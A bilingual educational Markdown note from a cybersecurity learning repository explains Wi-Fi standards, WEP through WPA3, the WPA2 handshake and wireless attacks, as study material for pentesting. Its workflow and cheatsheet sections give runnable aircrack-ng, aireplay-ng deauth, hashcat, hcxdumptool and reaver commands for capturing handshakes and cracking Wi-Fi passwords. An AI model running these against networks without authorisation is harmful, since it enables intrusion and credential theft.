# 📡 Wireless 802.11 Security & Attacks

> **LearnCybersecurity** | Networking Fundamentals Series  
> 📅 Last Updated: 2026 | 👤 Author: kodoktheGr3at

---

## 📖 Daftar Isi / Table of Contents / 目次

| # | Topic | Bahasa Indonesia | English | 日本語 |
|---|-------|-----------------|---------|--------|
| 1 | 802.11 Standards | Standar Wi-Fi & frekuensi | IEEE 802.11 Standards & Frequencies | IEEE 802.11規格と周波数帯 |
| 2 | Wi-Fi Security Protocols | WEP, WPA, WPA2 vs WPA3 | WEP, WPA, WPA2 vs WPA3 Architecture | WEP、WPA、WPA2とWPA3の比較 |
| 3 | 4-Way Handshake | Proses autentikasi WPA2 | WPA/WPA2 4-Way Handshake Lifecycle | WPA2の4ウェイハンドシェイク |
| 4 | Attack Vectors | Deauth, PMKID, Evil Twin | Deauthentication, PMKID & Evil Twin | 認証解除攻撃、PMKID、Evil Twin |
| 5 | Aircrack-ng Workflow | Panduan praktis aircrack-ng | Hands-on Aircrack-ng Pentest Workflow | Aircrack-ng実践ペンテスト手順 |
| 6 | Cheatsheet | Perintah audit Wi-Fi | Wireless Security Cheatsheet | 無線LANセキュリティチートシート |

---

## 1. 📻 IEEE 802.11 Standards & Spectrum Overview

| Standard | Frequency Band | Max Data Rate | Security Profile |
|:---|:---|:---|:---|
| **802.11b** | 2.4 GHz | 11 Mbps | WEP (Broken) |
| **802.11g** | 2.4 GHz | 54 Mbps | WPA / WPA2-Personal |
| **802.11n (Wi-Fi 4)** | 2.4 GHz / 5.0 GHz | 600 Mbps | WPA2 (AES-CCMP) |
| **802.11ac (Wi-Fi 5)**| 5.0 GHz | 6.93 Gbps | WPA2 / WPA3-Personal |
| **802.11ax (Wi-Fi 6)**| 2.4 GHz / 5.0 GHz / 6.0 GHz | 9.6 Gbps | WPA3-SAE Mandatory |

---

## 2. 🔐 Wi-Fi Security Evolution: WEP to WPA3

1. **WEP (Wired Equivalent Privacy - 1997)**: Menggunakan cipher stream RC4 dengan Initialization Vector (IV) pendek 24-bit yang lemah. **Sangat rentan (bisa di-crack dalam hitungan detik)** menggunakan serangan FMS/KoreK/PTW.
2. **WPA (Wi-Fi Protected Access - 2003)**: Menggunakan TKIP (*Temporal Key Integrity Protocol*). Masih menggunakan cipher RC4 namun dengan per-packet key mixing.
3. **WPA2 (802.11i - 2004)**: Mengganti RC4 dengan **AES-CCMP** (*Counter Mode CBC-MAC Protocol*). Menggunakan pre-shared key (PSK) dan rentan terhadap offline dictionary attack jika 4-way handshake tertangkap.
4. **WPA3 (2018)**: Menggantikan PSK dengan **SAE (Simultaneous Authentication of Equals)** berbasis Dragonfly handshake. Melindungi dari offline dictionary attack dan menyediakan *Forward Secrecy*.

---

## 3. 🤝 WPA/WPA2 4-Way Handshake Lifecycle

```
Supplicant (Client)                                   Authenticator (Access Point)
  │                                                                 │
  │<── 1. [Message 1] ANonce (AP Random Number) ────────────────────│
  │                                                                 │
  │    (Client calculates PTK using: PMK + ANonce + SNonce + MACs)  │
  │                                                                 │
  │─── 2. [Message 2] SNonce + MIC (Message Integrity Code) ───────>│
  │                                                                 │
  │    (AP verifies MIC, calculates identical PTK)                  │
  │                                                                 │
  │<── 3. [Message 3] GTK (Group Temporal Key) + MIC ───────────────│
  │                                                                 │
  │─── 4. [Message 4] ACK (Confirmation) ──────────────────────────>│
  │                                                                 │
  │═══════════════════ ENCRYPTED AES-CCMP CHANNEL ══════════════════│
```

---

## 4. 🏴‍☠️ Wireless Attack Vectors

### 1. Deauthentication Attack (802.11 Frame Spoofing)
Frame manajemen 802.11 (seperti Deauth frame) pada standar WPA2 dikirimkan secara tidak terenkripsi (*plaintext*). Penyerang dapat memalsukan MAC AP dan mengirimkan frame Deauth untuk memutuskan client dari jaringan secara paksa, memicu client untuk melakukan koneksi ulang sehingga penyerang dapat menangkap **4-Way Handshake**.

### 2. PMKID Attack (Clientless WPA2 Cracking)
Pada banyak router modern, AP menyertakan PMKID dalam frame EAPOL pesan pertama. Penyerang tidak perlu menunggu ada user yang terhubung (*clientless*) untuk mengekstrak PMKID dan melakukan cracking password secara offline.

### 3. Evil Twin & Captive Portal Rogue AP
Penyerang membuat Access Point palsu dengan SSID yang persis sama dengan target. Menggunakan sinyal yang lebih kuat dan deauthenticating AP asli, korban akan terhubung ke Rogue AP milik penyerang.

---

## 5. 🛠️ Practical Aircrack-ng Pentesting Workflow

```bash
# ── STEP 1: ENABLE MONITOR MODE ──────────────────────────────
sudo airmon-ng check kill      # Terminate interfering network managers
sudo airmon-ng start wlan0     # Creates monitor interface wlan0mon

# ── STEP 2: NETWORK RECONNAISSANCE ───────────────────────────
sudo airodump-ng wlan0mon      # Discover nearby BSSIDs, Channels & Clients

# ── STEP 3: TARGETED CAPTURE ─────────────────────────────────
# Capture 4-way handshake on Channel 6 for specific BSSID
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture_wpa2 wlan0mon

# ── STEP 4: SEND DEAUTH FRAMES ───────────────────────────────
# Force client reconnection to capture handshake
sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# ── STEP 5: OFFLINE PASSWORD CRACKING ────────────────────────
# Crack WPA2 Handshake with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture_wpa2-01.cap

# Or crack via GPU with Hashcat (Mode 22000)
hcxpcapngtool -o hash.22000 capture_wpa2-01.cap
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

---

## 6. 🧠 Quick Reference Cheatsheet

```bash
# ── INTERFACE MANAGEMENT ─────────────────────────────────────
iwconfig                       # Show wireless extensions
sudo ip link set wlan0mon up   # Bring interface up
sudo airmon-ng stop wlan0mon   # Return to managed mode

# ── WPS & PMKID TOOLS ────────────────────────────────────────
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1 # Pixie Dust attack
```

---

> 📚 **References & Book Sources:**
> - Matthew Gast — *802.11 Wireless Networks: The Definitive Guide (2nd Edition)* (`~/Documents/Books/CyberSec/Networking/`)
> - William Stallings — *Network Security Essentials: Applications and Standards (4th Edition)* (`~/Documents/Books/CyberSec/Networking/`)
> - Georgia Weidman — *Penetration Testing: A Hands-On Introduction to Hacking* (`~/Documents/Books/CyberSec/Ethical Hacking/`)
> - Peter Kim — *The Hacker Playbook 3: Practical Guide To Penetration Testing* (`~/Documents/Books/CyberSec/Ethical Hacking/`)
> - `man airodump-ng`, `man aircrack-ng`, `man aireplay-ng`

> 🔖 **Repository:** [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)  
> 💬 **Feedback & Contributions welcome!** Open an issue or PR if you spot any errors.
